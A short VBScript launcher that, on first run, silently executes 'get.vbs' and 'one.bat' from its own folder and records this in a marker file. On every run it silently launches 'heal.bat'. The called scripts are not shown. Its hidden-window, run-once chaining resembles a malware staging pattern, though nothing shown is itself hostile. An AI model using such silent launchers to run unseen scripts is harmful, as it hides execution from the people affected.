Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get the current folder path
strFolder = objFSO.GetParentFolderName(WScript.ScriptFullName)

' Define paths for the files
txtFile = strFolder & "\sts.txt"
batFile = strFolder & "\one.bat"
getVbsFile = strFolder & "\get.vbs" ' Path to the .vbs file

' Check if the txt file exists
If Not objFSO.FileExists(txtFile) Then
    ' Run the get.vbs file
    If objFSO.FileExists(getVbsFile) Then
        objShell.Run """" & getVbsFile & """", 0, True ' Run the .vbs file synchronously
    End If

    ' Run the batch file silently
    objShell.Run """" & batFile & """", 0, False

    ' Create the txt file to indicate the batch file has been run
    Set markerFile = objFSO.CreateTextFile(txtFile)
    markerFile.WriteLine "Batch file executed."
    markerFile.Close
End If

batFilePath = strFolder & "\heal.bat"

' Execute the batch file silently
objShell.Run """" & batFilePath & """", 0, False


